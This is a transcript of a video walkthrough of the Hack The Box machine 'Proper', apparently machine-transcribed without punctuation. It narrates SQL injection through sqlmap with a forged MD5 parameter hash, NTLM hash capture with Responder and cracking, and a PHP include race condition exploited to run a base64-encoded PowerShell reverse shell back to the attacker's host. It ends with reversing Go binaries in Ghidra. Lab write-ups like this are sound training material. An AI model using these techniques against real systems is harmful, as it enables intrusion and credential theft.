 what's going on youtube this is ipsec i'm doing proper from hack the box which was a really tough windows box not because i had a lot of steps in fact there's only three but each one of those has something really challenging about it the first one is a sql injection into a website but the challenge is there's a second parameter that is a hash of the sql query you want to run plus a secret prepended to it so in order to automate this exploit we have to make use of sql maps eval function so it can populate that hash with every single query once you dump the database you get a list of credentials that you can use to log in and upon logging in you find a lfi that has the same exact um hashing thing but there is a trick to get it to execute code it's doing a file get contents on the file and then checking if it has a php tag and if it doesn't then it passes it to the include so you have to exploit that race condition in order to get code execution on the box which you find a client and server golang application that you have to do reversing and reversing go laying applications is just a pain so with all that being said let's jump in as always i'm going to start with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it proper and then the ip address of 101010231 this can take some time to run so i've already ran it looking at the results we have just one port open and that is http on port 80 and it's an iis web server running version 10 so a recent version of windows we can double check that this is windows by pinging it so 10 10 10 231 and the ttl's 127 so it is windows generally anything between like 65 and 128 i know it's windows below 65 most likely gonna be linux and above 128 i'm thinking some type of bsd device or a router or something like that so we know or have a good idea it is windows i am gonna do a full port scan so let's do sudo and map dash p dash to do all ports o a and map all dash ports 10 10 10 2 31 and the reason why i like doing this is because windows has a lot of ports that just not on the default end map such as winrm on port like 5985 5986 i believe so this will tell me those things it's not handy right now but down the line it may be so while nmap is running let's go take a look at the only thing we can which is a website so going to 10 10 10 231 we have this page it is index.html so we don't really have any um way to know what type of programming language the server runs on is it asp aspx php python i'm not positive we could try a few extensions to see what we have like php asp and aspx don't get anything only html and the fact that nmap didn't say those are robots i'm not even going to bother trying that because it should have ran that if you're curious i got that index.html by clicking the header in the top left i'm just going to take a look at the page to see if there is any actual links where is this go not really clickable so we don't really have that much i am going to run a go buster so we'll do go buster dir you hdb 10 10 10 231 w opt sec list word list or set list discovery web content and then raft small words lowercase.txt because it is windows so casing does not matter because it's on the ntfs file system if i do html and capitalize random things or capitalize this e it all goes to the same page so we don't have to worry about casing in our door bust dash o for out file and we'll just call this um let's see root dot go buster i don't know we could have given an extension but we don't know exactly what extension is on this page we guess we could have tried html but generally i don't brute force html extensions i don't know why it's just not something i do so let's take a look at the web console to see if there's anything else we can get i like doing this because we may see gets to like a wp-content directory telling us it's wordpress there's just a lot of information you can get from this we can see the fav icon is a 404 so the site doesn't have an icon but it is doing this weird product ajax.php so it looks like it leaked that it is a php web server and also this is weird um it's got a query we can see order equals id plus d-e-s-e which is like sort and a decrementing order in sql and then this h equals something so i'm just going to copy this url and we're going to try browsing to the page we get parameter missing or malformed so let's go and copy all the parameters and see what this gives us it looks like it's giving us this piece of the webpage so we can try sorting it by ascending order instead of descending and we get forbidden tamper tampering attack detected and at the minute right now i'm guessing this h stands for hash and it's doing some type of secure hash on this parameter so if we echo dash n that looks like 32 characters but we can check yep 32 so probably md5 some what is happening here is the website's doing some type of secure parameter and all the links that it gives it's going to do a hash of the order and then some secret only the web server knows and puts this here so that way it can know if the user modified anything because the user's not supposed to be ending parameters we can take a look at like just removing things and seeing how it behaves we get a parameter missing or malformed if we [Music] try putting like just zero here to see what happens nothing um we can just try fuzzing this and see if anything happens this is tampering attack uh probably the best way to fuzz this is using fuff so we can do f u and then fuzz and i'm going to do fluff dash h real quick how do we do it so dash u we probably want to put this in single quotes and then dash w for word list opt set list then we can go to discovery uh web content is it like a fuzzing thing instead of discovery yeah fuzzing and special characters this is the one i really like using it's gonna test all the special characters against this we spelt fluff correctly we probably have to no i don't think we have to do this header because this is a get request and that um header the content type is only required for post request in fluff so the issue is somewhere else um i'm guessing the page we're getting is something different than that so i'm going to do is a curl request and we can curl this entire thing and see what happens badly formatted i wonder if url encoding okay that's what it is so now if we do a v we get a 403 forbidden so that's what we want so do this plus asc fuzz and still not it i wonder if we do http colon slash there we go fluff for some reason needed http so all these things are giving us five words and if we go back here uh where is that curl um one two three four five so this is exactly what we're getting chances are we don't have to fuzz this one parameter so the next thing we want to do is see what happens if we just don't submit it so i'm going to open up burp suite and we're going to send this request there and play with it because it's a bit easier to visually see if we use the repeater tab so i'm going to send everything to burp suite maximize this my proxy intercept is on let's just control shift r send and we do this we get tampering attempt detected so if we wait oh yeah because we're just doing id ase so if we go back to what the legitimate one was let's see that was over here let's just copy this hash and see what this page looks like h is equal to that uh d-e-s-e was the default so this is what that page looks like if we just get rid of the hash and send it nothing parameter missing or malformed i'm going to try some type of type confusion attack and we still get nothing let's just try that and it looks like if the hash is missing we get some type of stack trace so this is common in like php files and i notice it a lot in like reverse shells so if we make dirt dub dub dub cdw uh v test.php and we do system request is equal to ipsec and then close this we have to put a php tag um i don't want that there we go so php dash s localhost 80. sudo and if i go to localhost now let's turn burp suite off localhost we call it test.php see error messages aren't being displayed on the web server but if we look at the error message here this is what it would have said if we're in like debug mode undefined variable request so whenever you use get variables or v like variables from the user always make sure it is set before trying to reference it because if you try to reference something that's not set you get an error message and if your server is in debug mode then your error messages will go to the user if it's not then they'll just go down to probably for log apache to error.log or wherever your php errors go so we have this and it's got this secure prem salt so i'm going to try to figure out how it hashes this so we know the legitimate hash is going to be let's see a1b is what we want to get to so i'm going to do echo dash n and we're going to say id desc and then paste the hash and we can do md5 sum and it's not a1b anything so that's definitely not it we can put the hash on the other side of it and this looks exactly like what it is i tried the this end first mainly because this is vulnerable to a hash length extension attack as well it may be a bit tough to pull off in the url but essentially um how hashing works is it goes and blocks and like hashes each thing and since we know the last block we can just continue on and generate hashes from this without knowing the secret if the secrets on this end then because we don't know what the last block of hashing was we can't just continue it if you want a video of actually exploiting the hash length exception tag just go to ipsec.rocks and i'm sure it is here yep right here using hash puppy to perform the attack so i'd watch that video if you want to know more of it but we don't have to do it because we already know we can validate this by saying ascending order and let's go back into burp suite or we can do it in a browser actually so let's copy this paste and we start with ram and we end with shredder so i'm going to guess if i change this to ascending order the shredder is going to be on top and the ram is going to be on the bottom and that will verify that we did this there we go shredders on the top rams on the bottom so what's left now is building a script to exploit this what i'm actually going to do is use sql map to generate this hash for me which will let me then just use sql map to exploit this whole thing we could now go and create a program to run manual sql queries but let's do it in sql map because this is a little known feature and it should be noted when i did this box for the first time i had done it the manual way like i did in crossfit 2 last week and that's just creating a python terminal application and writing all the sql queries by hand but since i did this box i did the sql map hdb academy module written by the creative sql map himself and there's a really cool feature if you go to the bypassive web application protections section that shows the dash dash eval flag and this lets us run some python code to change what the actual variable is and here it's actually doing pretty much the same thing with an h equals so this is somewhat used in actual applications so it's importing hash lib and then just md5ing id so i'm going to copy this code and we're going to go back to a window then copy the request from burp suite to a file so we can use it with sql map so copy to file call it products dash ajax dot php or not dot php i want dot request so i'm just let's fix that real quick and then we can do sql map dash r this file i have the hash and the clipboard there's the eval so let's do hash lib the parameter we want is actually going to be order but first we have to specify this plus order so we send this and it says an error while evaluating the code name something is not defined let's change this to single quotes because i actually actually put double quotes here so that was probably the issue type error unicode objects must be encoded before hashing let's just encode this then uh can't cat string to byte so let's encode this as well and it looks like it's running so it's going to be trying some of see it looks like it's my sequel yep i probably should have did dash dash batch so it doesn't ask me all these questions but uh there's not too much for us to test anyways so let's just let it do its thing i guess we could try like manly running a union injection but we'd have to manually hash a few things which is just painful so let's see what this does it's telling us the order parameter is vulnerable do i want to keep testing others nope and it gives us here so it is doing a boolean based injection and time based blind so maybe union was not vulnerable uh we can do a dash dash dump and then i can also specify threads to 10 to make it go a bit quicker and it will begin dumping the entire database so looks like the databases name is cleaner and now it's dumping the customers licenses um yeah it's just dumping a lot of things i'm gonna look back at the go buster we ran and there is a slash licenses directory which was a table name so i'm gonna go back over to the box and we're going to try slash licenses to see exactly what this is and it says please log in with your mail address and password so if we had found this we could have tried sql map here we can just do basic injection to see if anything works but no point in that when we have something here so we got this username and this hash i'm just going to google that hash to see if there's anything um maybe instead of googling we can go to hashes.org what is that no longer a thing um hash is org let's google that maybe it's down right now uh we can just go to crack station i guess one of that site went away it'll be a shame that was like my favorite place to go to check hashes so we get that it is a md5 sum of password one what was that username come on vicky solomon so we can just try this so copy and then we go over to licenses and its password was password1 and i want to just go through burp suite because whenever i look at login parameters i just like seeing if there's like c surf tokens and other things so we log in and it doesn't look like there's any protections it's just straight username and password um p a s s w o d password one there we go i must have typed it but we have just licenses and a logout license portal there's nothing really we can do with this um we have this one directory and licenses.php so we should be running a go buster so what i'm going to do is say go buster dir you http uh i did http twice and then we can say dash x for extension php dash w word list opt um set list word uh discovery web content rassmaul words lowercase.txt licenses.gobuster so let's see server matches non-existing oh what oh cause i'm doing license.php we can get rid of that just go in this directory and here we go index log out you can see other directories it's still dumping hashes here but we do have this so we can change the theme and that gives this parameter and it goes solar and then flatly and then darkly so whenever i see this i want to try to find how this is working so the very first thing i want to test is like darkly.php and we get a 404 not found i'm gonna try like um is there a themes directory so themes we don't have anything if i do darkly we get four three forbidden before it was the 404 so there is a directory darkly i'm going to try flatly so let's just do directory is equal to flatly and that is a43 as well so off the bat right now we know this theme directory with this parameter i mean yeah what this theme parameter is doing is it's going into a directory and then probably including a file we don't know what file it is um we can try putting dot dot and we get this tampering detected so i have a feeling we have to do the hashing thing again but since that um it's accepting user input at the start so it's let's say lfi function so we could do like file get contents it could also be an include but it's putting our parameter here so our param and then it's appending something and it doing this appending is going to make it difficult for us to get files i'm guessing it's doing more than just appending.php which is most what most of these things do and if all it does is append.php then we can work with this because we can just say okay we're going to make our pram equal to php filter convert do a magic i think it's um convert dash base64 no convert dot base64 dash encode i think and then resources equal to our parameter which we just put the file name like index and then let it append this.php for us to get this thing working we can't really do this because we don't know um exactly what it's appending it's appending a whole file name so it's could be a pending like theme.php so if we do index it adds theme.php and that's a 404. so this is why i'm not going to go into the php wrappers too much because based upon my enumeration this is probably what is going to happen before we can actually do anything though we probably should just create a python application so we can do this lfi so i'm going to do v [Music] inject.pi and it's time to do all our includes so we know we need hash lib to generate the hash and we need python request to make web request and then cmd which will give us our terminal application so we do class term is equal to our term cmd prompt is going to be equal to please subscribe and then we need a default function and all i want to do is test this so we'll just print args and then let's create an exit and all this does is return true and we just have to execute this so term is equal to term term dot term.cmd loop python3 inject.pi and it works awesome so the very first thing we have to do is create a hashing algorithm so i'm going to create a function it's called secure param and it'll just accept i guess arg i'm going to say hash is equal to hash lib.md5 and then salt is equal to let's go back to burp suite repeater grab this then we can do hash dot update args or actually salt plus ergs and then we want to encode them and we can return hex digest so here instead of print args we can print secure param args come on there we go and fix this typo run it and we can do darkly args is not defined do what oh i don't have it plural here darkly okay 9aa if we go back to the license page darkly is 9aa so we did this correctly the next thing we have to do is have our application log in so i'm going to create another thing so this will be deaf auth self and we can say self actually let's create an initialization now so whenever the terminate uh that's a terminator whenever a terminal starts we need to generate some variables so self.s is equal to request dot session and what this is going to do is just remember a cookie and handle all that for us and then we want to call what the is left in this with the super call so this is a um function within the term module and if i override this function then what it normally has isn't going to go through so that's why at the end of this i do the super thing which is going to say okay now go through your default initialization as if i did not override you hopefully that makes sense so this can now be self.s dot get let's define url so url is equal to http 10 10 10 231 so self.get url and all this is going to be doing is initializing our session in case we need to like make a request before we send a post sometimes like your get request generates the php session for you um then we do creds is equal to uh we have to get the credentials we used so we can probably go to proxy history it was most likely a post to licenses and it was password1 so this is it i'm going to do control shift u to [Music] url and decode this and this is going to be username it's equal to that and i don't know why it copied the wrong one password is equal to password1 that looks good and we want self.s post url plus slash licenses and then data is equal to creds and there's going to be the post request so here we can just do self.auth like this and this session should now be authenticated the one thing i want to do it is doing licenses with the slash here so i want to have that and for this default now we can say salt is equal to this we've already verified that is correct and then we can do what is the parameters it sends it's actually a get request so this can be r is equal to self.s dot get f string http 1010 or let's see url plus slash licenses slash i think licenses dot php licenses yeah we can just copy this actually what guess where i copied more cut there we go having two clipboards always choose the wrong one it's like plugging in a usb so this darkly we don't want that anymore we want this to be ergs and this h to be salt so now we should be able to include files so print our dot text so python 3 inject.pi and what we're going to do is try rfi uh the sql map do you want hashes yes yes sure let's go back to our www directory i'm going to remove that test.php we did because i don't want code execution on my box we can say http.server i put 8 000 is fine so we can try including something so let's just try http colon slash 10 10 14 8 and see what happens um why not specify 8 000 and we see the web server makes a request on uh appends header.inc so if we created that page for us so let's do www.v header.inc and we can test something so i'm going to do echo please subscribe and i always start with something simple when i do a file include because like php could be in safe mode which would block system it would block php info things like that actually safe mode's deprecated i think they may have just blacklist a bunch of those functions that could be dangerous and yes even php info is blacklisted but echo almost never is blacklisted so that's why i always test out with this first and when we try to execute this it will um make a request to us and then say forbidden tampering attempt detected so it looks like if this file exists right now it will error i'm just going to get rid of the php tags and try it again and we get a page so it does not like being in php i'm gonna try um we can just do dollar carat like that and then do it again tamping detected i'm just going to do a carrot and it actually works so it looks like it is um definitely related to doing php tags so the next thing i want to do is see if it actually included the file so i'm just going to go up and we see some type of stack trace so what is it doing um i'm going to actually just copy this clear put a bunch of lines and we'll try it again and i did this so we can get exactly where the first line is because there's multiple stack traces and i just wanted to make sure um i was doing them one at a time so let's see on line 36 it's doing a secure include looks like all of these are secure include so maybe it's the same error three times um we have it doing a file get contents searching for a php tag if that doesn't exist it attempts to include it and then it will die so it looks like falling secure whenever we execute php tag same exact thing so i'm not sure why um oh right here http wrapper is disabled so we can't use the http wrapper however we can um probably abuse unc paths because it is indeed linux so i do backslash backslash 1010 14 8 and let's get rid of our web server i'm just going to sudo nc lvmp445 and we can say directory slash the server makes a request back to me so we know we can potentially abuse smb what i'm going to do is run in packet so in packet dash let me not run packet uh responder and it's been a while since actually random sponder so let's get whatever the default arguments are dash wrf and we want to run it on time zero so responder dash i ton zero wrf run it with pseudo i is capital oh shoot let's see responder has some error apt install responder pip3 install let's see actually let's go github responder and what happened here is on my machine i installed multiple versions of python so we have python three and three nine and i'm guessing it's using the wrong version of python to execute responder but we should be able to install it manually does it have instructions usage acknowledge okay so let's go and opt get clone cd responder get pull let's just delete responder sudo get clone okay and we want to do python 3 dash m vm and we'll create it in vn source dot vm bin activate and we can do pip to probably install this i don't see a requirements.txt let's see python3 responder.pi pseudo dash i ton zero huh looks like it's working here let's just do wrf and it's listening for events so that was easier than i expected so let's do inject.pi and 1010 uh 14.8 slash i hit enter too early but it looks like we did capture something so we have a hash right here so what i want to do is see if we can crack this real quick so v hash this is a net ntlm so we can do hash cat dash h let's see dash dash example hashes net n2m v2 5600 so hashcat dash m 5600 then we give it the hash file and then the word list and we're just going to use roku so user share word list rock u.text and i'm going to do dash dash force and oh unknown cpu generic what is the fix to this i think i actually have to install like the opencl run time on my host which don't want to do now when my kraken is offline so i guess we can do john so let's do john word list is equal to usersharewordlistrocu.txt and i get that found path right looks like i did so we got the password as charlotte123 bang and that is for the web user so what we can do is go into our nmap directory and cat all ports dot nmap and we don't have anything listening this is where i test like when rm um and smb off to see if we have any file shares things like that but there's nothing we can really do except uh try to include a another file so i'm going to kill this responder window and because sql map is being annoying in that pane i'm just going to go to a new one and we're going to try including a file over the unc path the issue is the um let's see notes dot text the web server is doing a file get contents and then looking for [Music] this and if it finds that it exits if it doesn't find that then it's going to include that file and that's actually two times it's accessing the file so there's a race condition here um exists oh no it does exit if it's in then exit so if we give it the file and then the server sees oh there's no php tags in it it's going to include to access the file again because that file gets contents wasn't writing it to a directory if it wanted to be a bit more secure it would do a file get contents around the file assign it to a variable then like write that to disk and then do an include on that or do an eval on the variable but because it's actually requesting the file twice we can potentially replace it after it does this file get contents and then we'll include the modified file hopefully that makes sense and if it doesn't make sense maybe it will after we do this in order to abuse this race condition i'm going to install an application called inertify dash pools which i think it already exists on my box it does and what this allows us to do is create like um hooks into our file system to um monitor files so if i do i notify weight on let's just do touch test it's now waiting i'm going to cap this file and it tells me it opened it you can also do on events so if i do man i notify weight and we look at events it's got multiple ones so we could just do i notify weight dash e close on test and then if i open up test i guess vim opens and then closes let's do python 3 f is equal to open test it's not doing anything because the event is watching close so i do f dot close and we can see it ends there so this helps us because we can do an inertify well let's actually make dur smb and let's build a um malicious payload we want to send probably a reverse shell so i can go cp user share nashang and then shells invoke powershell tcp oneline.ps1 to copy it to my current directory and then let's v we have two reverse shells that we can use i typically always like just using the top one i'm not sure why it's just what i do let's replace this ip so this will be 10 10 14 8 and the port's going to be 9001 then the next thing we want to do is convert this into base 64. alternatively we could use a like web cradle so that would mean a php script that we executed on the server makes an http request to our server to download the script with like iex new object whatever um if i don't have to use web cradles i typically don't because it just adds another request and the iex payload can get caught it just looks suspicious so let's cat invoke powershell whatever and before we convert it into base64 we have to turn it into um utf uh 16-bit little endian and it's dash icon-t for dash two and all this did if we xxd it now we can see everything takes two bytes and in this output you see a period before everything because or a period after everything because it takes the two if we didn't do this i convert it looks like this just standard ascii so this is how it wants it and then we do base64 dash w zero for wrapping zero to put this whole base64 thing on one line if we didn't do that it would look like this so now that we have this we can create pwn.php and what we want to do is system and then we can say powershell nop for no profile dash w for window we make it hidden and dash enc for encoded command and we just paste our base 64 string so now we should be able to stand up our smb server so i'm going to do sudo smbserver.pi and then we'll do dash smb to support dash username web dash password was i don't know why i put a slash there charlotte one two three bang and this came from that smb thing and then we give it a share name i'm just going to call it share and then the working directory of our thing so we have that listening let's do nclvnp 9001 and let's make a request to the file so if we just went to 10 10 14 8 backslash share backslash that's all we do uh we only have to do it backslasher i think because it's going to append backslash header.include so let's just echo please subscribe to header.conclude so when we get this it should respond with please subscribe at the very top of the page so let's go up and we have indeed please subscribe so now we just have to exploit the race condition and this is where we use that i notify weight thing that we talked about so i notify weight dash e close header dot inc sleep 1 and then we'll copy pwn.php over top of header.inc so the way it's established let's get this again we can see header.enclosed it copied over pwn over top of this and then it includes it and we get a reverse shell so there's one thing i forgot to do and i always like doing rl wrap when i do reverse shells on windows so let's do that again so i'm going to overwrite header.include or header.inc whatever you want to say go back to this i notify wait thing send it again and wait another second or two and we should get this shell and now that i'm using our lrap it's read line wrap we have the up and down arrows so we're on this box we could go to users and then web i guess that's who we are desktop and get user.txt if we explore this box around i'm going to go into program files i always like doing program one this is going to get into the very first directory and then program two would get into the second it's just shorthand for writing program files um i forget what windows calls it maybe short path it's an old dos thing uh actually program 2 did not bring me where i thought it would um the main reason i use that is i always hate spaces because i type this and then realize i have to go back and put it in quotes so that's why i use those squigglies so inside of program files we have this mssm.exe and i know this from just like creating challenges this is an easy way to turn executables into services it's like non-sucking service manager or something uh if we go to google and ssm maybe service and let's see yeah the non-sucking service manager it's the funny name when i first saw it in a ctf i thought it was a joke and then google i was like oh this is an actual application but that's one clue that's running some type of custom service we maybe will do like get services uh that didn't work um let's see what's the command cmd list services windows i'm getting better at auto googling by hitting the down arrow display from command line let's start that's what i was going to do um cmd slash c net start so it looks like we don't have permission to view services there's probably a wmi command we can do that does it let's see wmy cmd list services starting and stopping i've always had better luck at getting services through using wmic but the command isn't obvious so i'm just going to go into let's see we got a few directories there is a cleanup directory so if i go into cleanup we have client.exe readme.md and server.exe so if i type readme.md we have just thing we find garbage on your system and delete it alpha release create an awesome gui check for additional pads so i would guess server.exe is running as a service probably set up by nssm i don't think that's a huge leap to go off of and if it is running as a service it's probably going to run as the system user which is like administrator so we want to download both of these files so i'm just going to copy client.exe and we can copy it over to our smb share so it was share slash yeah we just have to do share and this should work because um yeah we already have all the credentials and everything so let's do server.exe so we have these two files and i'm actually going to host this through our http server so i can access it from a windows box which will let us do some reversing of this a bit easier actually before we do that we can open it up in geezer and see what we see so let's do art geidra ghidra run and this should start it i have updated to the latest version just before doing this video so um you may want to update your ghidra it does these things like really weird or these things being go binaries as we're about to find out once we import it if we import let's say client.exe and let it do its thing of analyzing it we'll see how girling behaves and i don't have a lot of experience in reversing these binaries but if you just do like a hello world it's going to create like 2 000 plus functions because girling itself is just bloated it um it's pretty much a static compile so it puts everything it needs in the binary and make some really big things so makes it a bit harder to reverse if we open this up in cutter it wouldn't do anything about parsing the function names and you'd just be left with like three thousand functions to go sift around thankfully ghidra is a bit better and can do some parsing so we can look we have main so it probably starts here and we can see the binary there is a plugin that i'm going to use that will make this a bit better the main thing that it's going to do is let's see i think put arguments here so whenever it does a syscall it'll be smart enough to know the arguments let's see is there one here i can show before we switch the plugin just looking around so like it's doing this print line and then it's just blank and everything is um undefined or this one actually gets the number of arguments but once we install the plugin it'll be a bit better so let's close out of geedra and then close out of this go to firefox and we can google gidra reverse plugin tell it to google uh reverse girling plugin this go tools thing and the main issue here is it's compiled based upon um dja version if you go to like the closed issues you can see it doesn't work with geeja 9.1 and the author says you can just use gradle which is like a java package management thing i guess kind of like pip maybe i'm not 100 positive how to explain gradle but essentially it's a make file for java i guess i just explained it um being on the spot sometimes is hard so i'm gonna go here we're going to clone his repel and we can go in go tools and there is a build.gradle and it has instructions it says gradle dash p gidra install directory in the absolute path of gidra because it's going to include headers for that specific version the issue if you install it from apt is gradle is super old i'm not sure if this is like just not updated or when i did apt install gradle it just picked something bad but it's gradle four which will give us issues so if we do opt geedra um we're gonna see it fails to build with this issue if i google this line it'll tell me that uh this was included in gradle version five so let's go here search this discuss and yeah it's gradle five but we're using four so i google for download gradle and we can just manually install it so where is the package additional release page and then download binary only copy link let's see go here and get this direct link and i'll do up and we'll w get this i always like putting urls and quotes even though there it wasn't needed and we will make dirt gradle copy that zip in there and this is just habit whenever i unzip things i always like trying to unzip it in a clean directory in case they don't bundle the directory with it it looks like in this case they did so we can just move everything gradle 7.2 here and remove the gradle 7.2 directory and we have a clean instance of gradle here so let's go back into a go tools program and instead of doing the gradle on our system we can do opt gradle then bin gradle and now it's going to come oh did not compile let's see pretty sure this is what i had done before let's see gradle we can do dash v for version it is 7.2 that is good gidget install directory ls opt gedra that's where it is run with stack trace plugins so it looks like it's missing this home ipsec gradle 7.2 it expects gradle to be in my home directory not exactly sure why but let's just copy it there real quick um opt gradle and then gradle 7.2 the very first time i did this i had extracted gradle to my home directory so maybe there's some old config or something i didn't wipe that's my only guess so let's specify the path it's looking for there we go we're still in go to no did i just get rid of it okay let's do that again uh gradle great uh ben gradle so see if it compiles here it looks like it is so that was the issue uh the first run i would recommend trying to put it in up so it's not in a home directory but if it complains look at that error message so now we have it built we can go in dist and we have the geiger plugin so we can copy that into opt geedra and then extensions and you want to go opt-get your extensions if you do opt-geidra then geezer extensions it's not going to work i don't know why this second extension directory exists but that is an issue so now we can do gaijo run and install the plugin so file install extension and select go tools and that says please restart ghidra and i'm going to clean up the directory i made so the first time i ran geidra i created a new project and named it go so i was just deleting that so now we can create this we'll name this i guess temp and i'll call it proper we can open this and then when we parse the binary we just tell it it's a googling binary so exe right here it's defaulting to windows now because we have the plugin we can specify golang and we'll just do all the default analysis and it's going to look mostly the same but some of the decompiled output is going to be a bit cleaner if i can remember what i showed before we can look at it the other super weird thing about gerlain binaries is strings don't terminate by null bytes they're always in some type of serialized formats that will include the location and then length of the string maybe that makes sense later and maybe i'm wrong by that explanation but just one of the things me and oxdf noticed when doing this challenge so we can go to functions and again looks the same we go to main let's look at main dot main and what did we show before this os current before it was undefined is it still uh looks a little different but let's go to main.clean convert to string we got this printf before it was just open and closed now it's giving us a lot of data and it's still not great because it's like got this whole junk string and that's mainly because gauger's expecting to be terminated by a null byte but it's not um c that is let's just open up python real quick 0xc that's 12. one of this is 12. 1 2 3 4 5 6 7 8 9 10 11 12. so right here we can see this is going to be um size i don't know exactly what but i'll name it size question mark there we go and 0xc this is 12 and cleaning percent s that was 12 so this printf is going to print the first 12 characters here um oh xerox c is here i don't know exactly why it does both or what this one is used for uh we'll put more question marks around that because we're not sure but yeah girling binaries are just weird um at least it's easier to personal than before because this didn't used to be it actually i can show you how it used to look let's just open up cutter and like last year or whenever this is what debugging go binaries used to look like so we analyze it and once this is done we can look at all the functions and you'll probably laugh like yeah here it is good luck analyzing this like where is main i have no idea there's just so much stuff uh we can probably find main now that we know uh we're actually opening the client and this the server but yeah it's just painful so highly highly recommend using geeja for this and installing the plugin so where was i um we want to kind of analyze this thing and see what clean does we could just run it on our host but before we do that we should at least look a little bit into here this is where i like having multiple mars because both the disassembly and decompile output is super handy and it's a pain to jump between them so here's the main function right here it's saying if long this is less than two and then setting things i'm gonna guess this is the argument counter so we're going to say erg c i don't know the proper way to type that but that's my guess here and then we got five which may be a length and then this string i don't know what this is i'm going to click on it and we see it says clean so chances are this pointer is clean let's just double check that c-l-e-a-n yep and this is five clean is five uh letters long so again it's keeping that same format of length and then string here we're going to something plus 0x18 is equal to 2. and i want to say this is going to be length and then this will be a pointer to the string so let's just rename this to be um i'm gonna say argv all these names may be wrong again whenever you do analysis like this um be prepared to rewrite things and i'm going to set a plate comment before and i'm going to say actually a pre-comment um [Music] let's see what do we think this is second arg length apply so we kind of have an idea there it's doing two and then right here looks like it's the pointer to the string and then five two two d so this looks like it is hex if i just do like man ascii we can look at 2d 2d is a dash and the other one was what 5 2. let's search for 5 2 find out what it is looks like capital r so hex five two is capital error so this is um we can do semicolon dash r so if the second argument is dash r then local 58 this is probably gonna be a size so we go here and this is weird we have re so i'm going to undefine this stuff let's clear code bytes so let's start here are now four characters i'm going to go here and to the next one and hit c as well let's see r-e-s-t oh there we go i was just undefining bytes i don't know how to make this say it is um seven characters long it looks like you're laying storing it as two different variables or not girling um ghidra is but this is restore so we can name this one restore so looking at this code right now it's going to execute it's going to look at arguments and if the second argument is dash r it's going to execute the restore function otherwise it's going to execute the clean function here we're pulling a username i don't know exactly what these variables are we have ergc here right here it's doing main.clean somewhere right here it's doing main.restore so let's look at main.clean to see what this looks like this is where we have this big printf and we already talked about that being the size so it really is only writing out cleaning percent s and it's going to read directory we don't know what that's reading we can go to this dat let's see that's just to move something i don't know exactly what this is something here not sure converting something to string oh it's looking at time so we have a call to time and then os stat i'm guessing this one is wrong and this is really the file name it's trying to stat and then there's a if this is less than this minus something do this and just based around all these time things let's see what this value is so let's go back to python do i have it in this down pane up here that is one six two zero zero zero uh actually i cut off a zero it is two five nine two zero zero zero and i'm going to guess this is seconds so this is a big leap if you do a lot more time reversing it would probably make sense but in this short video we're just making leaps because we see it doing a bunch of time functions time.now os stat on a file so you may think it's um seconds and we can see that is 30 days so it's doing something and if the file is older than 30 days call main dot service clean on it so what we have to figure out is how it's pulling files it was before it calls this doing something with user and it's reading a directory here so i'm thinking maybe the directory is stored in the main function so let's go back there and i haven't really troubleshooted i reverse it to this level because i was doing a lot more dynamic reversing when i did this box see main clean current user i don't know where it's getting the directory but let's just execute this program i've already copied it to a windows 10 machine i have client and server.exe so if i run server.exe just going to open up a command prompt let's open another one and run client dot slash client exe and it says it's going to be cleaning c colon users ipsec downloads and then doesn't do anything if we had a file that was older than 30 days in that downloads directory it may do something let's see what is the properties on this for the time modified 2020 so maybe it's modify time i'm going to copy this into my downloads so users ipsec downloads and let's see what happens and it says cleaning coin users ipsec downloads it does a clean function and um deleted that file it's no longer in here if we looked more about that clean function actually we'd have to reverse the server next to see what it does i guess we can do that before we look ahead and cheat so let's go to server.exe remember to change this over to golang okay analyze it yeah it's going to take a few seconds but what this does is puts it in program data so sql and backslash program data and if we go to cleanup we have a base64 string i believe this is encrypted i think if we like looked at the entropy of this it would be um high-end well we'd have to unhex it and then look at the entropy but it's just hex and if we want to on base64 it we can do that let's just open up cyber chef input from base64 we can see that's just the full file name so going back into [Music] here we have server.exe so let's look at functions main and we have a few things so there is create server and it's doing a new named pipe and where is the length it's setting again we just have this huge thing and i'm guessing one two three four five six seven eight nine ten eleven so is it setting b somewhere i don't know how it knows this is the length of eight but this is the pipe name oh here it is zero xp so we got the pipe name of it just doing cleanup pipe then there's an error os exit so let's look at the clean function to see exactly what this does so read file it's going to encrypt it with some private key so that is the encryption base64 right here and here we have it doing something to c colon program data and then a string so that's how we know it's doing something here if we look at the restore function it's going to pretty much just on base64 on hex decrypt and restore it so let's try using this debt restore functionality so we deleted it if i do dash r let's just say please subscribe it says restoring please subscribe and we don't have anything here because that's not deleted if i restore r put the full path it says it is restoring user's ipsec downloads client.exe because that's the file we copied there and can't find it let's see i wonder if i just give it client.exe so open clean up and it's base 64 in this so base64 client let's just make this bigger for you that may help okay so i wonder if i will have to base64 encode this let's go back here instead of from we can say two and we'll restore this string cannot find the file let's look at the cleanup directory and it actually doesn't exist anymore so something we did indeed fixed it that b was me like trying to use t-mux commands to switch to this terminal window i'm going to run this again so we can find out exactly what cleans it up we probably need to recopy the file into downloads it exists but when it copied it over it put a new timestamp on it so i'm going to do make this come on man that is a really specific thing to change the size let's see can i just do windows up yeah hotkeys are amazing until i just send it down let's see here there we go now we can see everything happening so i'm going to do client.exe and it's going to clean downloads and i'm hitting enter here i don't know why i have to do that something's waiting for user input i'm guessing when it's running as a service it's not but we can see it deleted it from downloads so i'm going to do a dash capital r we're just going to pass this entire thing in to see exactly what it says so downloads client.exe it's restoring it and it restored it so the very first thing i did it worked we just don't get a message here saying it restored we know it's working by named pipes so what i'm going to do is install named pipe monitor uh that's from io ninja i just got the trial of it so you just go to downloads you can download a trial it's the best tool i know to monitor named pipes do we i thought i had it installed um oh it's probably iron ninja yeah so we do pipe server and run as administrator and run it and then we give it a pipe name up here in the top left if we want to verify what the pipe name was uh we think it was um cleanup pipe based upon revo viewing the source code but we can verify that pipe exists by git child items and then dot backslash dot pipe backslash i think is it dot backslash pipe like that yeah so we have a list of all the pipes here and cleanup pipe exist it's currently a length of nine so i think there's something waiting to be read then uh let's see clean up pipe let's do type dot slash dot pipe let's see is it get content gci that exists now the length is 12. i think me trying to read it increase the length will go more into pipes in a bit but instead of troubleshooting that let's just put cleanup pipe here and then start listening so we started and we're listening on the pipe let's try cleaning up again so i'm going to go to my desktop copy client.exe put it in downloads so it has a old timestamp of older than 30 days and then we run client.exe it says it cleaned if we go in here uh i could have swore it should um output that we had data let's try restoring there we go so i don't know why the clean didn't happen but we can see the restore command gets sent so it says restore and then this and then disconnects i'm going to try clean again because we should see that clean command i wonder if there's some timing thing so i don't know if there's a way just to sit on pipe and listen i don't know if that's what pipe monitor is doing but you can read a name pipe two ways i forget the names 